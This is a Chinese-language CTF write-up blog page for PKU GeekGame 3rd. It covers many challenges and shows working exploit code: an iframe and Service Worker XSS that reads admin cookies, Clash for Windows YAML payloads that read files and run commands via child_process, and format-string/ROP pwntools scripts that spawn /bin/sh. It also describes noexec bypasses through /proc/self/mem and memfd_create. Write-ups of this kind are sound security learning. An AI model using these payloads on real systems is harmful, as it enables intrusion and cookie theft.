@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Write-up for GeekGame 3rd</title>
+        <link rel="stylesheet" href="/css/normalize.min.css">
+        <link rel="stylesheet" href="/css/magick.css">
+        <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+        <link rel="icon" href="/favicon.ico" type="image/x-icon">
+        <script>
+            // Immediately set the theme based on user's preference stored in localStorage
+            (function() {
+                const savedTheme = localStorage.getItem('theme');
+                if (savedTheme) {
+                    document.documentElement.setAttribute('data-theme', savedTheme);
+                    document.documentElement.style.colorScheme = savedTheme;
+                } else {
+                    const prefersDarkScheme = window.matchMedia('(prefers-color-scheme: dark)').matches;
+                    const defaultTheme = prefersDarkScheme ? 'dark' : 'light';
+                    document.documentElement.setAttribute('data-theme', defaultTheme);
+                    document.documentElement.style.colorScheme = defaultTheme;
+                }
+            })();
+        </script>
+    </head>
+    <body>
+        <div>
+            <main>
+                <header>
+                    <nav>
+                        <ul>
+                            <li><a href="/">Posts</a></li>
+                            <li><a href="/friends.html">Friends</a></li>
+                            <li><a href="/about.html">About</a></li>
+                            <li id="theme-toggle"><a><span class="fas fa-moon"></span></a></li>
+                        </ul>
+                    </nav>
+                    <h1>Write-up for GeekGame 3rd</h1>
+                </header>
+                <section>
+                    <blockquote>
+<p>你说的对，但是《PKU GeekGame》是由北京大学计算中心自主研发的一道全新开放世界 CTF 比赛……</p>
+</blockquote>
+<p>今年比赛梗密度一如既往的高， 题目一如既往的有趣。通过这此比赛也学习到了不少新知识，包括二维码的编码方式，gzip 的编码方式，Service Worker 的安全性。感谢主办方的辛勤组织和付出，期待 GeekGame 越来越好。</p>
+</section><section>
+<h2>学习到的新技能</h2>
+<p>这是第三次参加 GeekGame 了。非常喜欢有这样的交流平台，因为每次参考都能从别人的解答中学习到新技能、新工具。这些对优化平时的工作流有极大的帮助，正所谓“工欲善其事，必先利其器”。这里记录一下新学习的内容。</p>
+</section><section>
+<h3>使用 ZMODEM 传输文件</h3>
+<p>SCP 和 rsync 之类的需要直接或者通过代理/端口转发访问机器的工具都不能用来在办公网和生产环境机器之间传输文件<span class="sidenote-anchor"></span><span class="sidenote">https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob05-zserver</span>。如果要实现本地和终端之前传输，可以使用 ZMODEM 协议。支持该协议的常用包是 lrzsz，可惜的是目前很多终端软件没有实现或者没有正确实现该协议。目前我找到了一个替代方案 <a href="https://trzsz.github.io/ssh">trzsz</a>，该方案为了解决终端软件没有实现 ZMODEM 协议的问题，独自实现了该协议，并写了一个 SSH wrapper 叫 <code>tssh</code>。</p>
+</section><section>
+<h3>使用 VirusTotal 索引二进制文件</h3>
+<p><a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a> 是一个在线病毒扫描工具。因为它会记录所有用户上传的历史文件，我们可以用它来确定某个文件是官方发布的，还是经过出题人修改的。</p>
+<hr />
+<p>以下是 writeup 的正文。其中包括一些补做的内容。题目在这个链接<span class="sidenote-anchor"></span><span class="sidenote">https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/problemset</span>。</p>
+</section>
+</section><section>
+<h2>Tutorial</h2>
+</section><section>
+<h3>一眼盯帧</h3>
+<p>题目文件是一张以 GIF 格式呈现的动画，每一帧都包含一个字符。问题的主要挑战在于，每一帧的播放时间太短，难以清晰看出每一帧上的内容。为了应对这一挑战，我在网络上找了一个能延长每一帧的播放时间的工具，这样就能观察每一帧的内容，将每一帧的内容拼接起来，就能得到字符串 <code>synt{rawblgurtrrxtnzr}</code> 。简单的观察可以发现使用了凯撒加密，只需进行枚举解密即可轻松获得答案。</p>
+</section><section>
+<h3>小北问答</h3>
+<p>问题1：在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？</p>
+<p><a href="https://blog.csdn.net/Kangyucheng/article/details/104858780">直接搜一下原问题就能得到答案</a>。</p>
+<p>问题2：根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？</p>
+<p>找到<a href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile">其开源代码</a>即可。</p>
+<p>问题3：每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？</p>
+<p>在这个<a href="https://www.gsmarena.com/apple_watch_series_8-11866.php">移动设备网上搜索一下</a>，这里有一个小坑：代码编号的首字母要大写。</p>
+<p>问题4：本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）</p>
+<p>查看<a href="https://github.com/PKU-GeekGame/gs-backend/blob/ba1de3496eb435e5bcc6c18a83f1cf1ed726fa24/src/store/user_profile_store.py#L54-L61">源代码</a>并打印出禁用的 emoji 图标的数量。</p>
+<p>问题5：在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）</p>
+<p>首先在维基百科看到2011年哔哩哔哩使用的网络域名是 <code>bilibili.us</code>。然后在web archive上查看2011年1月游戏分区主页。</p>
+<p>问题6: 这个照片中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）</p>
+<p>使用谷歌搜图，即可以知道该大型建筑物是卢森堡音乐厅。</p>
+</section><section>
+<h2>MISC</h2>
+</section><section>
+<h3>Z 公司的服务器</h3>
+<p>Flag1: 重放一下 pcap 发出的数据即可得到 flag1。</p>
+<p>Flag2: 当时发现 payload 里面有校验码，找到了 <a href="https://gallium.inria.fr/~doligez/zmodem/zmodem.txt">zmodem 的标准</a>并尝试去除多余的校验码字符，但是没读明白。</p>
+<p>学习了一下<a href="https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/players_writeup/1721#z-%E5%85%AC%E5%8F%B8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8">其他选手的解法</a>，其实可以直接调库完成格式的转换。</p>
+</section><section>
+<h3>猫咪状态监视器</h3>
+<p>当时看到<code>LIST</code>命令没有任何输出，很困惑，后来就没看这题了。赛后看了一下，这个工具没有对参数进行检查，可以利用路径穿越的漏洞。</p>
+</section><section>
+<h3>基本功</h3>
+<p>Flag1: 根据 <a href="https://github.com/kimci86/bkcrack">bkcrack</a> 中的教程进行明文攻击。注意到压缩包里面有一个 Chrome 的安装文件。 这里的问题是我们不知道安装文件的版本，幸运的是，我们可以知道这个安装文件的文件大小。我们可以枚举所有版本，然后根据文件大小确定安装文件。</p>
+<p>Flag2: 同样是进行明文攻击。观察到题目给出的文件是一个 pcapng 格式的文件。根据<a href="https://pcapng.com/">文件的格式内容</a>，我们可以知道，第9个到第24个字节的内容。根据已知的字节就可以使用明文攻击了。</p>
+</section><section>
+<h3>Dark Room</h3>
+<p>Flag1: 根据游戏源代码，我们可以知道最优解在结束的时候只有90分，然而，游戏要求我们要达到117分才能通关。观察到help指令每次有20%的概率能够增加10分。那么我们可以不断的重复游戏，直到 help 成功 3 次获得达到额外的30分就能通关游戏了。由于每次只有20%的概率能够加10分，我们需要重复大概125次游戏。</p>
+<p>Flag2: 进入房间后发现输入字符串，能够暴露出部分源代码。 阅读源代码，发现每次如果最低位是1，需要生成两个巨大的质数。这个生成质数的过程非常消耗时间。所以我们可以根据程序的反应时间来判断最低位是0还是1。不断的重复这个过程，我们就能得到整个数字。通过数字转字节数组，就能得到最终的答案。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span></span><code class="language-python">import time
+
+binary_result = []
+try:
+    for i in range(5000):
+        start_time = time.time()
+        io.sendline(b&#39;1&#39; * 50)
+        response = io.recvuntil(b&#39;give me a number&#39;, timeout=3)
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+
+        if elapsed_time &lt; 0.3:
+            binary_result.append(&#39;0&#39;)
+            print(i, elapsed_time)
+        elif elapsed_time &lt; 2:
+            binary_result.append(&#39;1&#39;)
+            print(i, elapsed_time)
+        else:
+            print(response)
+            break
+except Exception as e:
+    print(f&quot;An error occurred: {e}&quot;)
+
+result_string = &#39;&#39;.join(binary_result)  # Combine the binary results into a single string
+</code></pre>
+</section><section>
+<h3>麦恩·库拉夫特</h3>
+<p>这是一题基 Minecraft 的题目。因为不想折腾，没有下载这个游戏。题目也没有看。赛后看了一下解答，感觉需要对游戏里的游戏特性（红石电路，命令方块）有相当了解才容易做出这题。</p>
+</section><section>
+<h2>Web</h2>
+</section><section>
+<h3>Emoji Wordle</h3>
+<p>Flag1: 枚举每个位置放哪个 emoji 是正确的。</p>
+<p>Flag2: 解码 session 里面的 JWT token。</p>
+<p>Flag3: 当时没做出来，当时以为要伪造 JWT。正确做法是类似重放攻击，不断重放在有效期内的 JWT token 就可以进行很多次的尝试。</p>
+</section><section>
+<h3>第三新XSS</h3>
+<p>很喜欢这题，和很多大学给每个老师分配一个路径的使用场景很类似。</p>
+<p>Flag1: 在页面中新建一个 iframe，并在其中访问受害者页面。然后直接读取我们想要的cookie<span class="sidenote-anchor"></span><span class="sidenote">https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security</span>。官方解答还提到，如果通过 <code>X-Frame-Options</code> 禁用了 iframe，使用 <code>window.open</code> 依然可以绕过。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span></span><code class="language-html">&lt;iframe src=&quot;http://&lt;出于安全考虑隐去&gt;.geekgame.pku.edu.cn/admin&quot; sandbox=&quot;allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+    const frame = document.querySelector(&#39;iframe&#39;);
+    const doc = document;
+    frame.onload = () =&gt; {
+        doc.title = frame.contentWindow.window.document.cookie
+    };
+&lt;/script&gt;
+</code></pre>
+<p>Flag2: 没做出来。需要用到 Service Worker。</p>
+<p>注册：</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span><code class="language-js">(async function() {
+    await navigator.serviceWorker.register(&#39;/flag2_b/sw.js&#39;, {
+        scope: &#39;/&#39;,
+    });
+})()
+</code></pre>
+<p>Service Worker 代码:</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span></span><code class="language-js">self.addEventListener(&#39;fetch&#39;, (event) =&gt; {
+    console.log(&#39;fetch&#39;, event.request.url);
+    if(event.request.url.indexOf(&#39;/admin/&#39;)!==-1) {
+        event.respondWith(
+            new Response(
+                &#39;&lt;script&gt;setInterval(()=&gt;{document.title=&quot;got: &quot;+document.cookie}, 100)&lt;/script&gt;&#39;,
+                { headers: {&#39;Content-Type&#39;: &#39;text/html&#39;} }
+            )
+        );
+    }
+});
+</code></pre>
+</section><section>
+<h3>简单的打字稿</h3>
+<p>Flag1: 学习<a href="https://zhuanlan.zhihu.com/p/454968751">教程</a>。用 <code>StringToArrray</code> 拆分 flag 1。</p>
+<pre><span class="line-number"><span>1</span></span><code class="language-ts">type StringToArrray&lt;T extends string&gt; = T extends `${infer L}${infer R}` ? [L, ...StringToArrray&lt;R&gt;] : [];
+</code></pre>
+<p>Flag2: 用教程里的 <code>LastOfUnion</code> 取出 <code>type flag2 = object | { ... }</code> 中的 <code>{ ... }</code>，再用 extends 和 infer 组合得到 flag2。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span></span><code class="language-ts">type UnionToIntersection&lt;T&gt; = (T extends any ? (x: T) =&gt; void : never) extends (
+  x: infer R
+) =&gt; void
+  ? R
+  : never;
+
+type LastOfUnion&lt;T&gt; = UnionToIntersection&lt;
+  T extends any ? (x: T) =&gt; void : never
+&gt; extends (x: infer L) =&gt; void
+  ? L
+  : never;
+</code></pre>
+</section><section>
+<h3>逝界计划</h3>
+<p>没做出来。官方解答是用 nmap 进行文件读写： <code>-iL /flag.txt -oN /media/log.txt.jpg</code>。官方解答还提到实现 RCE 的方法。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span></span><code class="language-">-iL &lt;inputfilename&gt;: Input from list of hosts/networks
+-oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
+     and Grepable format, respectively, to the given filename.
+</code></pre>
+</section><section>
+<h3>非法所得</h3>
+<p>Flag1: 用 Flag3 的 RCE 方法读取 Flag。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span></span><code class="language-yaml">proxies:
+  - name: a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#39;X&#39;).alt=require(&#39;fs&#39;).readFileSync(&#39;/app/profiles/flag.yml&#39;,&#39;utf-8&#39;).substring(86,116)`);&gt;
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;8088&quot;
+    skip-cert-verify: true
+
+proxy-groups:
+  -
+    name: Hello
+    type: select
+    proxies:
+    - a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#39;X&#39;).alt=require(&#39;fs&#39;).readFileSync(&#39;/app/profiles/flag.yml&#39;,&#39;utf-8&#39;).substring(86,116)`);&gt;
+</code></pre>
+<p>Flag2: 买了一台的阿里服务器，上面放着用于取 flag 的网页。然后修改代理服务器的 dns 配置，把原神官网域名指向之前我们部署的服务器 IP。</p>
+<p>Flag3: 在 Github 上找到 <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">POC 代码</a> ，稍微修改一下即可实现 RCE。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span></span><code class="language-yaml">proxies:
+  - name: a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#39;X&#39;).alt=require(&#39;child_process&#39;).execSync(&#39;/app/readflag&#39;)`);&gt;
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;8088&quot;
+    skip-cert-verify: true
+
+proxy-groups:
+  -
+    name: Hello
+    type: select
+    proxies:
+    - a&lt;img/id=&quot;X&quot;/src=&quot;1&quot;/onerror=eval(`document.getElementById(&#39;X&#39;).alt=require(&#39;child_process&#39;).execSync(&#39;/app/readflag&#39;)`);&gt;
+</code></pre>
+</section><section>
+<h2>Binary</h2>
+</section><section>
+<h3>汉化绿色版免费下载</h3>
+<p>Flag1: 挂 IDA 在内存中搜索 flag 即可。</p>
+<p>Flag2: 找了很久没有找到能够解压 XP3 格式文件的软件，但是找到了能<a href="https://github.com/arcusmaximus/KirikiriTools">解压存档的软件</a> 。通过观察存档文件，我们可以得到两个信息。第一，我们输入的 flag 是被 hash 成一个数字的；第二，我们可以知道每个字母被输入了多少次。根据第一个信息并且通过多次的试玩，我们可以观察到 hash 算法是 <code>s = (13337 * s + 11 * inputchar) mod 19260817, inputchar('A') = 1, inputchar('E') = 2, ... inputchar('}') = 6</code>。感觉这个方法非常依赖观察能力，应该不是标准解答。结合第二个信息，我们可以搜索所有可能的 flag 字符串，并检查他们的 hash 值是否和存档里的相同。</p>
+<p>赛后看了一下解答，解答是用 <a href="https://github.com/morkt/GARbro">GARbro</a> 这个工具进行解包操作的。</p>
+</section><section>
+<h3>初学 C 语言</h3>
+<p>Flag1: 用 <code>%8$p%9$p%10$p...</code> 可以打印存放在栈上的答案。</p>
+<p>Flag2: 比赛时没做出来。当时 syscall 的 rdi 参数写错了，没调试出来。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span><span>33</span><span>34</span><span>35</span><span>36</span><span>37</span><span>38</span><span>39</span><span>40</span><span>41</span><span>42</span><span>43</span><span>44</span><span>45</span><span>46</span><span>47</span><span>48</span><span>49</span><span>50</span><span>51</span><span>52</span><span>53</span><span>54</span><span>55</span><span>56</span><span>57</span><span>58</span><span>59</span><span>60</span><span>61</span><span>62</span></span><code class="language-python"># The 6-th args in printf() is at rsp or rbp-0x4f0
+# Ret address is at rbp+0x8
+
+# The ?-the args is rbp
+#     ? = 6 + (0x4f0 / 8) = 164
+
+io.recvuntil(b&#39;Please input your instruction:\n&#39;)
+io.sendline(b&#39;%164$p&#39;)
+rbp_address = int(io.recvuntil(b&#39;\n&#39;, drop=True).decode(), 16)
+
+io.recvuntil(b&#39;Please input your instruction:\n&#39;)
+io.sendline(b&#39;%165$p&#39;)
+ret_address = int(io.recvuntil(b&#39;\n&#39;, drop=True).decode(), 16)
+
+# leak address
+print(f&#39;{rbp_address=:x}&#39;)
+print(f&#39;{ret_address=:x}&#39;)
+
+def write_byte(addr, b: int):
+    io.recvuntil(b&#39;Please input your instruction:\n&#39;)
+
+    if b &gt; 0:
+        len_byte = len(str(b))
+        pad = b&#39;a&#39; * (7 - len_byte)
+        str_byte = str(b).encode()
+        io.sendline(b&#39;%&#39; + str_byte + b&#39;c%36$hhn&#39; + pad + p64(addr))
+    else:
+        io.sendline(b&#39;%35$hhna&#39; + p64(addr))
+
+def write_long(addr, long):
+    print(f&quot;write {long:x} at {addr:x}&quot;)
+    for i in range(8):
+        c = long // 256**i % 256
+        write_byte(addr + i, c)
+
+bin_sh_addr = rbp_address - 0x450 - 0x10
+for i, c in enumerate(b&#39;/bin/sh\00&#39;):
+    write_byte(bin_sh_addr + i, int(c))
+
+# ROP
+
+# 0x7ffff7f393fd  --&gt;   0x00005a777 + 0x7FFFF7F2F000
+# ret_address   --&gt; ?
+# ? = ret_address - 0x7ffff7f393fd + 0x7FFFF7F2F000 + 0x00005a777
+# = ret_address -41981 + 0x00005a777(gadget)
+
+base_address = rbp_address - 0x7fffffffe470 + 0x7fffffffe468
+print(f&#39;{base_address=:x}&#39;)
+write_long(base_address + 0x00, ret_address -41981 + 0x000005a777)    #  pop rax ; ret
+write_long(base_address + 0x08, 59)  # sys_execv
+write_long(base_address + 0x10, ret_address -41981 + 0x0000009cd2)    #  pop rdi ; ret
+write_long(base_address + 0x18, bin_sh_addr)  # 0
+write_long(base_address + 0x20, ret_address -41981 + 0x000001781e)    #  pop rsi ; ret
+write_long(base_address + 0x28, 0)  # 0
+write_long(base_address + 0x30, ret_address -41981 + 0x0000009bdf)    #  pop rdx ; ret
+write_long(base_address + 0x38, 0)  # 0
+write_long(base_address + 0x40, ret_address -41981 + 0x0000059512)    #  mov eax, eax ; syscall
+
+io.recvuntil(b&#39;Please input your instruction:\n&#39;)
+io.sendline(b&#39;exit&#39;)
+
+io.interactive()
+</code></pre>
+</section><section>
+<h3>Baby Stack</h3>
+<p>Flag1: 没做出来。不是很明白提示中的 “integer overflow” 是什么，我看到汇编里用的是 <code>ja</code> 来判断输入字母串的长度的。<code>ja</code> 指令应该是比较无符号整数的，所以不太清楚怎么利用漏洞。</p>
+<p>赛后看了，原来是当 <code>len=0</code> 时， <code>len-1</code> 判断会溢出，此时允许我们输入任意长的字符串。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span></span><code class="language-c">ssize_t __fastcall get_line(char *buf, unsigned int len)
+{
+  unsigned int i; // ebp
+  ssize_t result; // rax
+  char *v4; // rbx
+
+  for ( i = 0; ; ++i )
+  {
+    result = len - 1;
+    if ( (unsigned int)result &lt;= i )
+      break;
+    v4 = &amp;buf[i];
+    result = read(0, v4, 1uLL);
+    if ( *v4 == 10 )
+    {
+      *v4 = 0;
+      return result;
+    }
+  }
+  return result;
+}
+</code></pre>
+<p>Flag2: 没做出来。赛后看了一下还是一道 printf 题。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span></span><code class="language-py">def exec_fmt(payload):
+    p = start()
+    p.sendlineafter(b&#39;(less than 0x20 characters)\n&#39;, b&#39;123&#39;)
+    p.sendlineafter(b&#39;capture it?:&#39;, payload)
+    p.recvuntil(b&#39;so you want to \n&#39;)
+    ret = p.recvline()
+    info(ret)
+    p.close()
+    return ret
+
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+
+io = start()
+
+io.sendline(b&#39;%21$p&#39;)
+io.recvuntil(b&#39;this is your flag: &#39;)
+libc_leak_value = int(io.recvuntil(b&#39;\n&#39;, drop=True).decode(), 16)
+info(f&#39;leaked libc at {hex(libc_leak_value)}&#39;)
+libc.address = libc_leak_value + 0x7ffff7c00000 - 0x7ffff7c29d90
+info(f&#39;libc base: {hex(libc.address)}&#39;)
+
+# https://docs.pwntools.com/en/stable/fmtstr.html
+io.sendlineafter(b&#39;capture it?:&#39;,
+                 fmtstr_payload(offset, {exe.got[&#39;puts&#39;]: libc.sym[&#39;system&#39;]}))
+io.sendlineafter(b&#39; and your flag again? :&#39;, b&#39;/bin/sh&#39;)
+io.interactive()
+</code></pre>
+</section><section>
+<h3>绝妙的多项式</h3>
+<p>Flag1: 观察到题目需要我们解一个整数线性方程。 用 SymPy 求解即可。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span></span><code class="language-python">from sympy import Matrix
+b = &lt;期望输出，从 .rodata 中读出&gt;
+mod = 998244353
+A = [ (i+1) ** j % mod for i in range(n) for j in range(n) ]
+A = Matrix(n, n, A)
+Ai = A.inv_mod(mod)
+B = Matrix(n, 1, b)
+sol = Ai * B % mod
+flag = &#39;&#39;.join(map(chr, list(sol.T)))
+</code></pre>
+<p>Flag2: 观察到题目使用了一个 NTT 变换<span class="sidenote-anchor"></span><span class="sidenote">https://oi-wiki.org/math/poly/ntt/</span>。做一次逆变换即可得到答案。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span><span>33</span><span>34</span><span>35</span><span>36</span><span>37</span><span>38</span><span>39</span><span>40</span></span><code class="language-python">def change(y):
+    length = len(y)
+    rev = [0] * length
+
+    for i in range(length):
+        rev[i] = rev[i &gt;&gt; 1] &gt;&gt; 1
+        if i &amp; 1:
+            rev[i] |= length &gt;&gt; 1
+
+    for i in range(length):
+        if i &lt; rev[i]:
+            y[i], y[rev[i]] = y[rev[i]], y[i]
+
+
+def NTT(a, inverse = False):
+    m = len(a)
+    m2 = m
+
+    inv_p = inv(m)
+    if inverse:
+        change(a)
+
+    while m2 &gt; 1:
+        m2 //= 2
+        for i in range(0, m, 2*m2):
+            for j in range(0, m2):
+                p = i+j
+                q = i+j+m2
+                v5 = &lt;从 .rodata 中读出的常数&gt;[j+m2]
+                if inverse:
+                    v5 = inv(v5)
+                P = a[p]
+                Q = a[q]
+                a[p] = (P+Q)%mod
+                a[q] = (P-Q+mod)*v5%mod
+
+    if inverse:
+        for i in range(m):
+            a[i] = a[i]*inv_p % mod
+        change(a)
+</code></pre>
+<p>Flag3: 观察到题目使用 NTT 变换，实现了多项式的乘法 ployA x polyB = ployC。可以变换成一个线性方程，用 Z3 求解即可。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span></span><code class="language-python">from z3 import *
+flag3_len = 0x28
+
+s = Solver()
+A = [Int(f&#39;a_{i}&#39;) for i in range(flag3_len)]
+for i in range(n):
+    s.add(And(A[i] &gt; 32, A[i] &lt; 127))
+for i, c in enumerate(&#39;flag{&#39;):
+    s.add(A[i] == ord(c))
+s.add(A[-1] == ord(&#39;}&#39;))
+
+A_pad = [A[i] if i &lt; len(A) else 0 for i in range(0x40)]
+
+B = [  &lt;从 .rodata 中读出的 ployB&gt;[i%0x22] for i in range(0x40)  ]
+
+for i in range(0x40):
+    ss = []
+    for a in range(i+1):
+        b = i-a
+        ss.append(A_pad[a] * B[b])
+    ss = Sum(ss)
+    cont = ss == &lt;从 .rodata 中读出的 ployC&gt;[i]
+    s.add(cont)
+</code></pre>
+</section><section>
+<h3>禁止执行，启动</h3>
+<p>题意，绕过文件系统的 <code>noexec</code> 选项。</p>
+<p>Flag1: 用 LLDB 的 <code>expr __asm (...)</code> 执行汇编代码。也可以用 <code>p $rdi = 0</code> 设置寄存器，然后 <code>syscall</code>。</p>
+<p>Flag2: 当时没做出来。需要利用 <code>/proc/&lt;pid&gt;/mem</code> 来读写<span class="sidenote-anchor"></span><span class="sidenote">https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c#L926</span>应用的内存（前提是有 ptrace 的权限）,而且可以写任意只读部分<span class="sidenote-anchor"></span><span class="sidenote">https://elixir.bootlin.com/linux/v5.9/source/kernel/fork.c#L1217</span>。内核对此有相关的安全考虑，称为 YAMA 特性<span class="sidenote-anchor"></span><span class="sidenote">https://www.kernel.org/doc/html/v4.15/admin-guide/LSM/Yama.html</span>。在 <code>/proc/sys/kernel/yama/ptrace_scope</code> 可以看到默认的级别是 1 （restricted ptrace，默认只允许读写子进行的内存）。</p>
+<p>这题的官方解答<span class="sidenote-anchor"></span><span class="sidenote">https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob07-noexec/README.md#flag-2</span>用了一个有趣的技巧。问题是这样的，我们需要用一些工具（hexdump, dd, tail）对父进程的 mem 文件进行读写，但是这是违反 YAMA 规则的。解决的方法是，让父进程自己打开，然后把文件描述符传给子进程。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span><code class="language-sh">$ exec 3&lt;&gt;/proc/self/mem
+$ ls /proc/self/fd/3 -al
+lrwx------ 1 linux linux 64 Oct 21 00:28 /proc/self/fd/3 -&gt; /proc/141090/mem
+$ dd &lt;&amp;3
+dd: error reading &#39;standard input&#39;: Input/output error
+</code></pre>
+<p>这题还有些很怪的地方，当我尝试把 <code>cat /bin/busybox</code> 保存下来时，不知道是哪一层的终端模拟器在 <code>0x0a</code> 前面加 <code>0x0d</code> 字节，导致导出的文件不能用。一种解决方法是套一层 base64 编码。</p>
+<p>另外，这个项目<span class="sidenote-anchor"></span><span class="sidenote"><a href="https://github.com/arget13/DDexec">Github - arget13/DDexec</a></span>对 mem 文件的有更加的探讨。</p>
+<p>Flag3: 当时没做出来。用 <code>memfd_create()</code> 这个系统调用可以创建 rwx 的文件<span class="sidenote-anchor"></span><span class="sidenote"><a href="https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html">In-Memory-Only ELF Execution (Without tmpfs)</a></span>。然后用符号链接构造好运行环境，这利用了 <code>noexec</code> 是按照被链接到的对象决定进行判断的特点。</p>
+</section><section>
+<h2>Algorithm</h2>
+</section><section>
+<h3>关键词过滤喵，谢谢喵</h3>
+<p>Flag1: 把所有字符替换成字母a。把每1000个字母a替换成字母d，把每100个字母a替换成字母c，把每10个字母a替换成字母b。 输出的时候，把 abcd 字母的个数转成数字即可。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span></span><code class="language-python">prog = [
+    Replace(False, r&#39;[\n\r]&#39;, r&#39;a&#39;),
+    Replace(False, r&#39;.&#39;, r&#39;a&#39;),
+
+    Replace(False, r&#39;a{1000}&#39;, r&#39;d&#39;),
+    Replace(False, r&#39;^&#39;, r&#39;d&#39;),
+
+    Replace(False, r&#39;a{100}&#39;, r&#39;c&#39;),
+    Replace(False, r&#39;(d+)&#39;, r&#39;\1c&#39;),
+
+    Replace(False, r&#39;a{10}&#39;, r&#39;b&#39;),
+    Replace(False, r&#39;(c+)&#39;, r&#39;\1b&#39;),
+
+    Replace(False, r&#39;$&#39;, r&#39;a&#39;),
+
+    Replace(False, r&#39;([abcd])\1{9}&#39;, r&#39;9&#39;),
